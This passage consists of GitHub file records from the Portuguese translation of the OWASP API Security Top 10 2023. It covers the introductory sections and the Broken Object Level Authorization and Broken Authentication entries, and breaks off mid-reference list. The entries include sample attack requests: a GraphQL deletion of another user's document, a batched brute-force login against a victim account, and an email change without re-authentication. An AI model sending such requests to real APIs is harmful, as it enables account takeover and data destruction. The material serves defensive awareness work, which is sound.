{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0x00-toc.md", "content": "# Tabela de Conteúdos\n\n* [Tabela de Conteúdos](0x00-toc.md)\n* [Sobre a OWASP](0x01-about-owasp.md)\n* [Prefácio](0x02-foreword.md)\n* [Introdução](0x03-introduction.md)\n* [Notas da Versão](0x04-release-notes.md)\n* [Riscos de Segurança em APIs](0x10-api-security-risks.md)\n* [OWASP Top 10 API Security Risks – 2023](0x11-t10.md)\n* [API1:2023 Broken Object Level Authorization](0xa1-broken-object-level-authorization.md)\n* [API2:2023 Broken Authentication](0xa2-broken-authentication.md)\n* [API3:2023 Broken Object Property Level Authorization](0xa3-broken-object-property-level-authorization.md)\n* [API4:2023 Unrestricted Resource Consumption](0xa4-unrestricted-resource-consumption.md)\n* [API5:2023 Broken Function Level Authorization](0xa5-broken-function-level-authorization.md)\n* [API6:2023 Unrestricted Access to Sensitive Business Flows](0xa6-unrestricted-access-to-sensitive-business-flows.md)\n* [API7:2023 Server Side Request Forgery](0xa7-server-side-request-forgery.md)\n* [API8:2023 Security Misconfiguration](0xa8-security-misconfiguration.md)\n* [API9:2023 Improper Inventory Management](0xa9-improper-inventory-management.md)\n* [API10:2023 Unsafe Consumption of APIs](0xaa-unsafe-consumption-of-apis.md)\n* [O Que Se Segue Para Programadores](0xb0-next-devs.md)\n* [O que Se Segue Para DevSecOps](0xb1-next-devsecops.md)\n* [Metodologia e Dados](0xd0-about-data.md)\n* [Agradecimentos](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:27:01.952857"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0x01-about-owasp.md", "content": "# Sobre a OWASP\n\nOpen Worldwide Application Security Project (OWASP) é uma comunidade aberta que\nse dedica a ajudar as organizações a desenvolver, adquirir e manter aplicações e\nAPIs confiáveis.\n\nA OWASP disponibiliza de forma livre e aberta:\n\n* Ferramentas e normas de segurança aplicacional.\n* Livros completos sobre testes de segurança aplicacional, desenvolvimento\n  de código seguro e revisão de código focada em segurança.\n* Apresentações e [vídeos][1].\n* [_Cheat Sheets_][2] sobre assuntos diversos.\n* Controlos e bibliotecas de segurança _standard_.\n* [Comunidades locais espalhadas por todo o mundo][3].\n* Investigação de ponta.\n* Múltiplas [conferências em todo o mundo][4].\n* [Listas de discussão][5] ([arquivo][6]).\n\nMais informação em: [https://www.owasp.org][7].\n\nTodas as ferramentas, documentos, vídeos, apresentações e comunidades locais da\nOWASP são livres e abertos a todos os interessados em melhorar a segurança\naplicacional.\n\nAconselhamos uma abordagem à segurança aplicacional como sendo um problema de\npessoas, processos e tecnologia, porque as abordagens mais eficazes à segurança\naplicacional necessitam de melhorias em todas estas áreas.\n\nA OWASP é um novo tipo de organização. A nossa independência em relação a\npressões comerciais permite-nos fornecer informação imparcial, prática e\neconomicamente adequada sobre a segurança aplicacional.\n\nA OWASP não está afiliada com nenhuma empresa tecnológica, embora suportemos o\nuso informado de tecnologias de segurança comerciais. A OWASP produz muitos\ntipos de materiais de uma forma colaborativa, transparente e aberta.\n\nA fundação OWASP é uma entidade sem fins lucrativos o que assegura o sucesso a\nlongo prazo do projeto. Quase todas as pessoas associadas à OWASP são\nvoluntárias, incluindo a direção da OWASP, os líderes das comunidades locais, os\nlíderes dos projetos e os seus membros. Suportamos investigação inovadora em\nsegurança através de bolsas e infraestrutura.\n\nJunte-se a nós!\n\n## Direitos de Autor e Licença\n\n![license](images/license.png)\n\nCopyright © 2003-2023 The OWASP Foundation. Este documento é distribuído de\nacordo com a licença [Creative Commons Attribution Share-Alike 4.0 license][8]. \nPara qualquer tipo de reutilização ou distribuição, deve deixar claro para \nterceiros os termos da licença deste trabalho.\n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://cheatsheetseries.owasp.org/\n[3]: https://owasp.org/chapters/\n[4]: https://owasp.org/events/\n[5]: https://groups.google.com/a/owasp.org/forum/#!overview\n[6]: https://lists.owasp.org/mailman/listinfo\n[7]: https://www.owasp.org\n[8]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:27:02.071005"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0x02-foreword.md", "content": "# Prefácio\n\nAs APIs - _Application Programming Interface_ têm um papel fundamental na\ninovação que observamos nos dias de hoje ao nível das aplicações. Desde a banca,\nretalho e transportes à Internet das Coisas (IoT), veículos autónomos e _Smart\nCities_, as APIs são hoje um elemento crítico nas aplicações móveis, _Software\nas a Service_ (SaaS) e aplicações web, sejam elas destinadas ao público em\ngeral, parceiros de negócio ou para uso interno das organizações.\n\nPor definição as APIs expõem lógica aplicacional e dados sensíveis tais como\ninformação pessoal (PII - _Personally Identifiable Information_), motivo pelo\nqual se têm vindo a tornar um alvo para os atacantes. Se não conseguirmos\ngarantir a segurança das APIs será impossível continuar a inovar a um ritmo\nacelerado.\n\nApesar de continuar a fazer sentindo manter uma lista dos 10 principais\nproblemas de segurança em aplicações web, devido à natureza particular das APIs,\né importante haver também uma tal lista específica para APIs.\nA segurança das APIs foca-se nas estratégias e soluções para compreender e\nmitigar as vulnerabilidades e risco de segurança associado às APIs.\n\nSe estiver familiarizado com o projeto [OWASP Top 10][1] com certeza notará as\nsemelhanças entre os documentos: elas são propositadas para facilitar a leitura\ne adoção deste. Se por outro lado for a primeira vez que tem contacto com um\ndocumento da série OWASP Top 10, sugerimos que comece por ler as secções [Riscos\nde Segurança em APIs][2] e [Metodologia e Dados][3] antes de aprofundar a lista\ndos dez problemas de segurança mais críticos em APIs.\n\nPode contribuir para o OWASP API Security Top 10 com perguntas, comentários e\nideias no repositório do projeto no GitHub:\n\n* https://owasp.org/www-project-api-security/\n* https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nPode ainda encontrar o OWASP API Security Top 10 em:\n\n* https://owasp.org/www-project-api-security/\n* https://github.com/OWASP/API-Security\n\nGostaríamos de agradecer a todos os que participaram neste projeto, tornando-o\npossível com o seu empenho e contribuições. A lista de contribuidores\nencontra-se na secção [Agradecimentos][4]. Obrigado!\n\n[1]: https://owasp.org/www-project-top-ten/\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:27:02.178638"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0x03-introduction.md", "content": "# Introdução\n\n## Bem-vindo ao OWASP API Security Top 10 - 2023!\n\nBem-vindo à segunda edição do OWASP API Security Top 10!\n\nEste documento de consciencialização foi publicado pela primeira vez em 2019. \nDesde então, a indústria de segurança das APIs cresceu e ganhou maturidade. Nós\nacreditamos fortemente que este trabalho contribuiu positivamente para tal,\ndevido a ter sido adotado rapidamente como referência na indústria.\n\nAs APIs desempenham um papel muito importante na arquitetura das aplicações \nmodernas. Devido à inovação ter um ritmo diferente do que a sensibilização\npara a segurança, nós acreditamos que é importante concentrarmo-nos nas\nfalhas de segurança mais comuns das APIs.\n\nO objetivo principal do OWASP API Security Top 10 é educar todos aqueles\nenvolvidos no desenvolvimento e manutenção de APIs, como por exemplo,\nprogramadores, _designers_, arquitetos, gestores ou organizações. Pode saber\nmais sobre o projeto API Security visitando a [página do projeto][1].\n\nSe não estiver familiarizado com a série OWASP Top 10, nós recomendamos que veja\npelo menos os seguintes projetos Top 10:\n\n* [OWASP Cloud-Native Application Security Top 10][2]\n* [OWASP Desktop App Security Top 10][3]\n* [OWASP Docker Top 10][4]\n* [OWASP Low-Code/No-Code Top 10][5]\n* [OWASP Machine Learning Security Top Ten][6]\n* [OWASP Mobile Top 10][7]\n* [OWASP TOP 10][8]\n* [OWASP Top 10 CI/CD Security Risks][9]\n* [OWASP Top 10 Client-Side Security Risks][10]\n* [OWASP Top 10 Privacy Risks][11]\n* [OWASP Serverless Top 10][12]\n\nNenhum destes projetos substitui qualquer outro: se está a trabalhar numa\naplicação móvel alimentada por uma API, então é melhor ler os dois documentos \nTop 10 correspondentes. O mesmo é válido se estiver a trabalhar num website ou \nnuma aplicação desktop alimentados por APIs.\n\nNa secção [Metodologia e Dados][13] pode ler mais sobre como esta edição foi \ncriada. Por agora encorajamos todos a contribuírem com perguntas, comentários e \nideias no nosso [repositório no GitHub][14] ou através da [_Mailing list_][15].\n\n[1]: https://owasp.org/www-project-api-security/\n[2]: https://owasp.org/www-project-cloud-native-application-security-top-10/\n[3]: https://owasp.org/www-project-desktop-app-security-top-10/\n[4]: https://owasp.org/www-project-docker-top-10/\n[5]: https://owasp.org/www-project-top-10-low-code-no-code-security-risks/\n[6]: https://owasp.org/www-project-machine-learning-security-top-10/\n[7]: https://owasp.org/www-project-mobile-top-10/\n[8]: https://owasp.org/www-project-top-ten/\n[9]: https://owasp.org/www-project-top-10-ci-cd-security-risks/\n[10]: https://owasp.org/www-project-top-10-client-side-security-risks/\n[11]: https://owasp.org/www-project-top-10-privacy-risks/\n[12]: https://owasp.org/www-project-serverless-top-10/\n[13]: ./0xd0-about-data.md\n[14]: https://github.com/OWASP/API-Security\n[15]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:27:02.379744"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0x04-release-notes.md", "content": "# Notas da Versão\n\nEsta é a segunda edição do OWASP API Security Top 10, exatamente quatro anos\napós a primeira versão. Muito mudou no panorama das API (a nível de \nsegurança). O tráfego das API aumentou a um ritmo acelerado, alguns protocolos \nde API ganharam muito mais popularidade, surgiram muitos novos vendedores/\nsoluções de segurança para API e, claro, os atacantes desenvolveram novas \ncapacidades e técnicas para comprometer APIs. Já era hora de atualizar a lista \ndos dez riscos de segurança de API mais críticos.\n\nCom uma indústria de segurança de API mais madura, pela primeira vez, houve [um \napelo público para dados][1]. Infelizmente, não foram fornecidos dados, mas \ncom base na experiência da equipa do projeto, numa análise cuidadosa por \nespecialistas em segurança de API e no feedback da comunidade sobre a versão \npreliminar, construímos esta nova lista. Na [secção Metodologia e Dados][2], \nencontrará mais detalhes sobre como esta versão foi elaborada. Para mais \ndetalhes sobre os riscos de segurança, consulte a [secção Riscos de Segurança \nem APIs][3].\n\nO OWASP API Security Top 10 2023 é um documento de sensibilização prospetivo \npara uma indústria de ritmo acelerado. Não substitui outros TOP 10. Nesta \nedição:\n\n* Combinámos *Excessive Data Exposure* e *Mass Assignment*, focando na causa\n  comum: falhas na validação de autorização ao nível das propriedades do objeto.\n* Damos mais ênfase ao consumo de recursos, em vez de nos concentrarmos na \n  rapidez com que são esgotados.\n* Criámos uma nova categoria \"*Unrestricted Access to Sensitive Business Flows*\"\n  para abordar novas ameaças, incluindo a maioria daquelas que podem ser \n  mitigadas através de *rate limiting*.\n* Adicionámos \"*Unsafe Consumption of APIs*\" para abordar algo que começámos a\n  observar: os atacantes começaram a procurar serviços integrados de um alvo \n  para os comprometer, em vez de atingirem diretamente as APIs do seu alvo. Este\n  é o momento certo para começar a sensibilizar sobre este risco crescente.\n\nAs APIs desempenham um papel cada vez mais importante na arquitetura moderna de \nmicrosserviços, *Single Page Applications* (SPAs), aplicações móveis, Internet \ndas Coisas (IoT), etc. O OWASP API Security Top 10 é um esforço necessário para \ncriar sensibilização sobre os problemas de segurança modernos das APIs.\n\nEsta atualização só foi possível devido ao grande esforço de vários voluntários, \nlistados na secção de [Agradecimentos][4].\n\nObrigado!\n\n[1]: https://owasp.org/www-project-api-security/announcements/cfd/2022/\n[2]: ./0xd0-about-data.md\n[3]: ./0x10-api-security-risks.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:27:02.482939"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0x10-api-security-risks.md", "content": "# Riscos de Segurança em APIs\n\nPara a análise de risco usámos a [metodologia de avaliação de risco da\nOWASP][1].\n\nA tabela seguinte resume a terminologia associada à pontuação correspondente ao\nnível de risco.\n\n| Agentes Ameaça | Abuso | Prevalência | Deteção | Impacto Técnico | Impacto Negócio |\n| :-: | :-: | :-: | :-: | :-: | :-: |\n| Específico da API | Fácil **3** | Predominante **3** | Fácil **3** | Grave **3** | Específico do Negócio |\n| Específico da API | Moderado **2** | Comum **2** | Moderado **2** | Moderado **2** | Específico do Negócio |\n| Específico da API | Difícil **1** | Incomum **1** | Difícil **1** | Reduzido **1** | Específico do Negócio |\n\n**Nota**: Esta abordagem não toma em consideração a probabilidade do Agente de\nAmeaça. Também não toma em consideração nenhum detalhe técnico associado à sua\nAPI. Qualquer um destes fatores podem ter impacto significativo na probabilidade\nde um atacante encontrar e abusar duma falha de segurança particular. Estes\nindicadores não tomam em consideração o impacto atual no seu negócio. Terá de\nser a sua organização a decidir qual o nível de risco para a segurança das suas\naplicações e APIs que está disposta a aceitar, baseado na cultura, indústria e\nregulação a que está sujeita. O propósito do OWASP API Security Top 10 não é\nfazer essa análise por si. Uma vez que esta edição não é baseada em dados, a \nprevalência resulta de um consenso entre os membros da equipa.\n\n## Referências\n\n### OWASP\n\n* [OWASP Risk Rating Methodology][1]\n* [Article on Threat/Risk Modeling][2]\n\n### Externas\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://owasp.org/www-project-risk-assessment-framework/\n[2]: https://owasp.org/www-community/Threat_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:27:02.586151"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0x11-t10.md", "content": "# OWASP Top 10 API Security Risks – 2023\n\n| Risk | Description |\n| ---- | ----------- |\n| [API1:2023 - Broken Object Level Authorization][api1] | As APIs tendem a expor mais _endpoints_  que manipulam identificadores de objetos, tornando as falhas no controlo de acessos mais suscetíveis a ataques. A verificação da autorização para acesso aos objetos deve ser tida em consideração em todas as funções que acedem a dados com base em informação fornecida pelo utilizador.|\n| [API2:2023 - Broken Authentication][api2] | Com frequência os mecanismos de autenticação são implementados de forma incorreta, permitindo aos atacantes comprometer os _tokens_ de autenticação ou abusar das falhas na implementação por forma a assumir a identidade de outros utilizadores de forma temporária ou permanente. |\n| [API3:2023 - Broken Object Property Level Authorization][api3] | Esta categoria combina [API3:2019 - Excessive Data Exposure][1] e [API6:2019 - Mass Assignment][2], focando na causa principal: a falta de validação de autorização adequada ao nível das propriedades do objeto. Isso leva à exposição ou manipulação de informações por partes não autorizadas. |\n| [API4:2023 - Unrestricted Resource Consumption][api4] | Satisfazer pedidos de API requer recursos como largura de banda de rede, CPU, memória e armazenamento. Outros recursos como emails/SMS/chamadas telefónicas ou validação biométrica são disponibilizados por fornecedores de serviços através de integrações de API, sendo pagos por pedido. Ataques bem-sucedidos podem levar a uma negação do serviço (DoS) ou a um aumento dos custos operacionais. |\n| [API5:2023 - Broken Function Level Authorization][api5] | Políticas de controlo de acesso complexas com diferentes níveis hierárquicos, grupos e perfis e uma não tão clara separação entre o que são ou não funcionalidades administrativas tendem a conduzir a falhas de autorização. Abusando destas falhas os atacantes podem ganhar acesso a recursos de outros utilizadores e/ou a funcionalidades administrativas. |\n| [API6:2023 - Unrestricted Access to Sensitive Business Flows][api6] | As APIs vulneráveis a este risco expõem um fluxo de negócio - como comprar um bilhete ou publicar um comentário - sem compensar por como a funcionalidade poderia prejudicar o negócio se fosse usada de forma excessiva e automatizada. Isto não resulta necessariamente de falhas de implementação. |\n| [API7:2023 - Server Side Request Forgery][api7] | As falhas de Server-Side Request Forgery (SSRF) podem ocorrer quando uma API está a obter um recurso remoto sem validar o URI fornecido pelo utilizador. Isto permite que um atacante force a aplicação a enviar um pedido manipulado para um destino inesperado, mesmo quando protegido por um firewall ou uma VPN. |\n| [API8:2023 - Security Misconfiguration][api8] | As APIs e os sistemas que as suportam normalmente contêm configurações complexas, destinadas a tornar as APIs mais personalizáveis. Os engenheiros de software e de DevOps podem ignorar essas configurações ou não seguir as melhores práticas de segurança quando se trata de configuração, abrindo a porta para diferentes tipos de ataques. |\n| [API9:2023 - Improper Inventory Management][api9] | As APIs tendem a expor mais _endpoints_ do que as aplicações web tradicionais, fazendo com que a documentação se torne ainda mais importante. Um inventário dos _hosts_ e APIs em execução também têm um papel importante na mitigação de falhas tais como versões de APIs descontinuadas e exposição de _endpoints_ para análise de problemas. |\n| [API10:2023 - Unsafe Consumption of APIs][api10] | Os programadores tendem a confiar mais nos dados recebidos de APIs de terceiros do que os fornecidos pelo utilizador, e por isso tendem a adotar padrões de segurança mais fracos. Para comprometer APIs, os atacantes visam os serviços de terceiros integrados em vez de tentarem comprometer a API alvo diretamente. |\n\n[1]: https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/\n[2]: https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/\n[3]: https://owasp.org/API-Security/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting/\n[api1]: 0xa1-broken-object-level-authorization.md\n[api2]: 0xa2-broken-authentication.md\n[api3]: 0xa3-broken-object-property-level-authorization.md\n[api4]: 0xa4-unrestricted-resource-consumption.md\n[api5]: 0xa5-broken-function-level-authorization.md\n[api6]: 0xa6-unrestricted-access-to-sensitive-business-flows.md\n[api7]: 0xa7-server-side-request-forgery.md\n[api8]: 0xa8-security-misconfiguration.md\n[api9]: 0xa9-improper-inventory-management.md\n[api10]: 0xaa-unsafe-consumption-of-apis.md\n", "timestamp": "2025-10-24T22:27:02.688903"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xa1-broken-object-level-authorization.md", "content": "# API1:2023 Broken Object Level Authorization\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **Fácil** | Prevalência **Predominante** : Deteção **Fácil** | Técnico **Moderado** : Específico do Negócio |\n| Os atacantes podem explorar *endpoints* de API vulneráveis a *broken object-level authorization* ao manipular o ID de um objeto enviado no pedido. Os IDs de objetos podem ser números inteiros sequenciais, UUIDs ou *strings* genéricas. Independentemente do tipo de dado, são fáceis de identificar no alvo do pedido (parâmetros do caminho ou da *string* de consulta), cabeçalhos do pedido ou até mesmo como parte do conteúdo do pedido. | Este problema é extremamente comum em aplicações baseadas em API porque o componente do servidor geralmente não acompanha completamente o estado do cliente e, em vez disso, confia mais em parâmetros como IDs de objetos, que são enviados pelo cliente para decidir a quais objetos aceder. A resposta do servidor geralmente é suficiente para entender se o pedido foi bem sucedido. | O acesso não autorizado a objetos de outros utilizadores pode resultar na divulgação de dados a partes não autorizadas, perda de dados ou manipulação de dados. Em certas circunstâncias, o acesso não autorizado a objetos também pode resultar na apropriação completa da conta. |\n\n## A API é vulnerável?\n\nA autorização de acesso ao nível do objeto é um mecanismo de controlo que \ngeralmente é implementado ao nível do código para validar que um utilizador só \npode aceder aos objetos aos quais deveria ter permissão para aceder.\n\nCada *endpoint* de API que recebe um ID de um objeto e realiza alguma ação sobre\no objeto deve implementar verificações de autorização ao nível do objeto. As \nverificações devem validar que o utilizador autenticado tem permissões para \nrealizar a ação solicitada sobre o objeto alvo.\n\nAs falhas neste mecanismo geralmente conduzem à divulgação não autorizada de \ninformações, modificação ou destruição de todos os dados.\n\nComparar o ID do utilizador da sessão atual (e.g. ao extraí-lo do token JWT) com\no parâmetro de ID vulnerável não é uma solução suficiente para resolver a falha \nde Broken Object Level Authorization (BOLA). Esta abordagem pode endereçar \napenas um pequeno subconjunto de casos.\n\nNo caso de BOLA, é por design que o utilizador tem acesso ao *endpoint*/função \nda API vulnerável. A violação ocorre ao nível do objeto, através da manipulação \ndo ID. Se um atacante conseguir aceder a um *endpoint*/função da API ao qual não\ndeveria ter acesso - este é um caso de [Broken Function Level Authorization][5] \n(BFLA) em vez de BOLA.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nUma plataforma de comércio eletrónico para criar lojas online oferece uma página\nde listagem com gráficos relativos à receita das lojas. Inspecionando os pedidos\nrealizados pelo navegador um atacante identifica os _endpoints_ da API usados\npara obter os dados a partir dos quais são gerados os gráficos bem como o seu\npadrão `/shops/{shopName}/revenue_data.json`. Utilizado outro _endpoint_ da API\no atacante obtém a lista com o nome de todas as lojas. Com recurso a um _script_\nsimples para substituir `{shopName}` no URL pelos nomes que constam da lista, o\natacante consegue acesso aos dados relativos às vendas de milhares de lojas\nonline.\n\n### Cenário #2\n\nUm fabricante de automóveis habilitou o controlo remoto dos seus veículos \natravés de uma API para comunicação com o telemóvel do condutor. A API permite \nao condutor iniciar e parar o motor e trancar e destrancar as portas \nremotamente. Como parte deste processo, o utilizador envia o Número de \nIdentificação do Veículo (VIN) para a API. No entanto, a API não valida se o VIN \nrepresenta um veículo que pertence ao utilizador autenticado, o que resulta numa \nvulnerabilidade de BOLA. Um atacante pode aceder a veículos que não lhe \npertencem.\n\n### Cenário #3\n\nUm serviço de armazenamento de documentos online permite aos utilizadores \nvisualizar, editar, armazenar e eliminar os seus documentos. Quando um documento \nde um utilizador é eliminado, é enviada uma mutação GraphQL com o ID do \ndocumento para a API.\n\n```\nPOST /graphql\n{\n  \"operationName\":\"deleteReports\",\n  \"variables\":{\n    \"reportKeys\":[\"<DOCUMENT_ID>\"]\n  },\n  \"query\":\"mutation deleteReports($siteId: ID!, $reportKeys: [String]!) {\n    {\n      deleteReports(reportKeys: $reportKeys)\n    }\n  }\"\n}\n```\n\nUma vez que o documento com o ID fornecido é eliminado sem quaisquer \nverificações adicionais de permissão, um utilizador pode conseguir eliminar o \ndocumento de outro utilizador.\n\n## Como Prevenir\n\n* Implementar um mecanismo de autorização baseado nas políticas de utilizador e\n  hierarquia.\n* Utilizar um mecanismo de autorização para verificar se o utilizador com sessão\n  ativa tem permissão para realizar a ação pretendida sobre o registo. Esta\n  verificação deve ser feita por todas as funções que utilizem informação\n  fornecida pelo cliente para aceder a um registo na base de dados.\n* Utilizar preferencialmente valores aleatórios e não previsíveis (e.g., GUID)\n  como identificador para os registos.\n* Escrever testes para avaliar o correto funcionamento do mecanismo de\n  autorização. Não colocar em produção alterações vulneráveis que não passem nos\n  testes.\n\n## Referências\n\n### OWASP\n\n* [Authorization Cheat Sheet][1]\n* [Authorization Testing Automation Cheat Sheet][2]\n\n### Externas\n\n* [CWE-285: Improper Authorization][3]\n* [CWE-639: Authorization Bypass Through User-Controlled Key][4]\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html\n[2]: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html\n[3]: https://cwe.mitre.org/data/definitions/285.html\n[4]: https://cwe.mitre.org/data/definitions/639.html\n[5]: ./0xa5-broken-function-level-authorization.md\n", "timestamp": "2025-10-24T22:27:02.789733"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xa2-broken-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xa2-broken-authentication.md", "content": "# API2:2023 Broken Authentication\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **Fácil** | Prevalência **Comum** : Deteção **Fácil** | Técnico **Grave** : Específico Negócio |\n| O mecanismo de autenticação é um alvo fácil para os atacantes, uma vez que está exposto a todos. Embora possam ser necessárias competências técnicas mais avançadas para explorar alguns problemas de autenticação, geralmente existem ferramentas de exploração disponíveis. | As conceções erradas dos engenheiros de software e de segurança sobre os limites da autenticação e a complexidade inerente da implementação tornam os problemas de autenticação prevalentes. Metodologias para detetar *broken authentication* estão disponíveis e são fáceis de criar. | Os atacantes podem obter controlo total das contas de outros utilizadores no sistema, ler os seus dados pessoais e realizar ações sensíveis em seu nome. Os sistemas têm pouca probabilidade de conseguir distinguir as ações dos atacantes das ações legítimas dos utilizadores. |\n\n## A API é vulnerável?\n\nOs _endpoints_ e fluxos de autenticação são ativos que carecem de proteção. Além \ndisso, mecanismos de recuperação de _password_ devem ser tratados da mesma forma \nque os mecanismos de autenticação.\n\nUma API é vulnerável se:\n\n* Permite ataques de _credential stuffing_, onde o atacante utiliza força bruta\n  com uma lista de nomes de utilizador e palavras-passe válidos.\n* Permite ataques de força bruta a uma conta de utilizador específica, não\n  implementando mecanismos de mitigação como _captcha_ ou bloqueio da conta por\n  excesso de tentativas de autenticação falhadas.\n* Permite a utilização de _passwords_ fracas.\n* Envia informação de autenticação, tal como _tokens_ e _passwords_, no URL.\n* Permite que os utilizadores alterem o seu endereço de email, _password_ atual \n  ou realizem outras operações sensíveis sem pedir a confirmação da _password_.\n* Não valida a autenticidade dos _tokens_ de autenticação.\n* Aceita _tokens_ JWT sem que estes sejam assinados/usando algoritmos fracos\n  `(\"alg\":\"none\")`\n* Não valida a data de expiração dos _tokens_ JWT.\n* Utiliza _passwords_ em texto, não encriptadas, ou resumos fracos.\n* Utiliza chaves de encriptação fracas.\n\nAlém disso, um microsserviço é vulnerável se:\n\n* Outros microsserviços podem aceder a ele sem autenticação\n* Utiliza tokens fracos ou previsíveis para impor autenticação\n\n## Exemplos de Cenários de Ataque\n\n## Cenário #1\n\nPara realizar a autenticação do utilizador, o cliente tem de enviar um pedido de \nAPI como o exemplo abaixo, com as credenciais do utilizador:\n\n```\nPOST /graphql\n{\n  \"query\":\"mutation {\n    login (username:\\\"<username>\\\",password:\\\"<password>\\\") {\n      token\n    }\n   }\"\n}\n```\n\nSe as credenciais forem válidas, é devolvido um token de autenticação que deve \nser fornecido em pedidos subsequentes para identificar o utilizador. A \nquantidade de tentativas de login está sujeita a uma limitação temporal \nrestritiva: apenas três pedidos são permitidos por minuto.\n\nPara efetuar login por força bruta com a conta de uma vítima, os atores \nmaliciosos aproveitam o agrupamento de consultas GraphQL para contornar a \nlimitação temporal restritiva de pedidos, acelerando o ataque:\n\n```\nPOST /graphql\n[\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"password\\\"){token}}\"},\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"123456\\\"){token}}\"},\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"qwerty\\\"){token}}\"},\n  ...\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"123\\\"){token}}\"},\n]\n```\n\n## Cenário #2\n\nPara atualizar o endereço de email associado à conta de um utilizador, os \nclientes devem enviar um pedido API como o exemplo abaixo:\n\n```\nPUT /account\nAuthorization: Bearer <token>\n\n{ \"email\": \"<new_email_address>\" }\n```\n\nDevido à API não exigir que os utilizadores confirmem a sua identidade \nfornecendo a sua _password_ atual, atores maliciosos que consigam colocar-se \nnuma posição de roubar o token de autenticação podem conseguir assumir a conta \nda vítima ao iniciar o processo de redefinição de senha após atualizar o \nendereço de email da conta da vítima.\n\n## Como Prevenir\n\n* Certifique-se de que conhece todos os fluxos de autenticação possíveis (e.g.\n  móvel/web/_deeplinks_/etc.). Pergunte aos engenheiros responsáveis quais os\n  fluxos em falta/não identificados.\n* Leia sobre os mecanismos de autenticação em uso. Certifique-se que compreende\n  quais e como são usados. OAuth não é um mecanismo de autenticação, assim como\n  também não o são as API _keys_.\n* Não reinvente a roda em termos de autenticação, geração de _tokens_,\n  armazenamento de _passwords_. Opte pela utilização de standards.\n* _Endpoints_ para recuperação de _password_ devem ser tratados como os\n  _endpoints_ de _login_ no que diz respeito à proteção contra ataques de força\n  bruta, limitação do número de pedidos e bloqueio de conta.\n* Exija nova autenticação para operações sensíveis (e.g. alterar o\n  endereço de email do proprietário da conta/número de telefone para\n  autenticação de dois fatores).\n* Utilize a [OWASP Authentication Cheatsheet][1].\n* Sempre que possível implemente autenticação de múltiplos fatores.\n* Implemente mecanismos anti-força bruta para mitigar ataques do tipo\n  _credential stuffing_, dicionário e força bruta nos _endpoints_ de\n  autenticação. Este mecanismo deve ter configurações mais restritivas do que\n  para os demais _endpoints_ da API.\n* Implemente [mecanismos de bloqueio de conta][2] / _captcha_ para prevenir\n  ataques de força bruta contra utilizadores específicos. Implemente verificação\n  da qualidade/força das _passwords_.\n* As API _keys_ não devem ser usadas para autenticação dos utilizadores. Apenas\n  devem ser usadas para autenticação dos [clientes da API][3].\n\n## Referências\n\n### OWASP\n\n* [Authentication Cheat Sheet][1]\n* [Key Management Cheat Sheet][4]\n* [Credential Stuffing][5]\n\n### Externas\n\n* [CWE-204: Observable Response Discrepancy][6]\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][7]\n\n[1]: 